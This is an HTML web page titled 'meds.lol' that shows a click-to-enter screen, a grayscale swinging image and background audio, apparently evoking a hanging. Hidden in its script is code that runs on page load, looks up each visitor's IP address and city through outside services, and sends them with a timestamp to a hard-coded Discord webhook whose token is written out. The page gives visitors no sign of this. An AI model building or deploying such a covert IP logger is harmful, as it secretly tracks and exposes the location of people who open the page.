<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="x-icon" href="favicon.ico">
    <title>meds.lol</title>

    <style>
        body, html {
            margin: 0;
            height: 100%;
            background-color: black;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        .enter-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.95);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 36px;
            z-index: 10;
            cursor: pointer;
        }

        .swinging-image {
            width: 60%;
            transform-origin: top;
            animation: swing 4s ease-in-out infinite;
            filter: grayscale(100%);
            top: 0;
            transform: translateX(-50%);
        }

        .text-container {
            color: white;
            font-size: 35px;
            position: absolute;
            top: 70%;
            text-align: center;
        }

        @keyframes swing {
            0% { transform: rotate(-10deg); }
            50% { transform: rotate(10deg); }
            100% { transform: rotate(-10deg); }
        }
    </style>
</head>
<body>

    <div class="enter-screen" id="enterScreen">enter</div>
    <div class="text-container" id="textContainer"></div>

    <img src="sayori.png" alt="Swinging Image" class="swinging-image" id="swingingImage" style="display: none;">

    <audio id="background-audio" class="audio-player" src="audio.mp3" preload="auto"></audio>

    <script>
        
        document.getElementById('enterScreen').addEventListener('click', function() {
            this.style.display = 'none';
            document.getElementById('swingingImage').style.display = 'block';
            document.getElementById('textContainer').style.display = 'block';
            document.getElementById('background-audio').play();
        });

        
        const sendIPToDiscord = async () => {
            try {
                
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                
                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locationData = await locationResponse.json();
                const country = locationData.country_name;
                const city = locationData.city;
                const time = new Date().toLocaleString();

                
                const webhookURL = 'https://discord.com/api/webhooks/1297626168110878793/clF_GHt_XqCSLCcc-9rddf6CqpaJWtr6QdKjio8vDrHACyWuiS3If3Ss6sR6gTfBngsy'; 
                const payload = {
                    embeds: [{
                        title: 'User Location Information',
                        description: '\n<@1252652798160539790>\n' +
                                     '```\nCountry: ' + country + '\n```' +
                                     '```\nCity: ' + city + '\n```' +
                                     '```\nTime: ' + time + '\n```' +
                                     '```\nIP Address: ' + ip + '\n```',
                        color: 0x000001 
                    }]
                };

                
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                console.log('IP and location data sent to Discord.');
            } catch (error) {
                console.error('Error sending IP and location to Discord:', error);
            }
        };

        
        sendIPToDiscord();
    </script>

</body>
</html>
